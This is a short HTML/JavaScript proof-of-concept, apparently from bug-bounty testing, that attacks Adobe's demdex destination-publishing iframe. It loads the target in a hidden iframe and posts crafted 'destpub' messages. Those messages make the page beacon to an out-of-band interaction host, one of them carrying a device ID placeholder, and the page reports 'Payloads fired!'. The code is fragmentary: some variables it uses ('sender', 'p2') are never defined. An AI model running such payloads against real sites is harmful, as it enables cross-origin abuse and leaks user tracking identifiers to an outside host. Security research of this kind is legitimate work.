<body>

    var callback = "https://vqlgkysoxnjswaflcnwdnfne34x7tg7d0.oast.fun";
    var target   = "https://dpm.demdex.net/dest4.html?d_nsid=0";

    var iframeURL = target + "#" + sender + "//elia874.github.io";

    var iframe = document.createElement("iframe");
    iframe.style.display = "none";

      var p1 = "---destpub---dests|1|img|" + callback + "/?hit=basic|10080";

      var p3 = "---destpub-debug---dests|3|img|" + callback + "/?debug=1&uuid=%did%|10080";

      iframe.contentWindow.postMessage(p1, "https://dpm.demdex.net");
      iframe.contentWindow.postMessage(p2, "https://dpm.demdex.net");
      iframe.contentWindow.postMessage(p3, "https://dpm.demdex.net");

      document.getElementById("status").innerText = "Payloads fired! Watch interactsh...";
    };

</body>
</html>
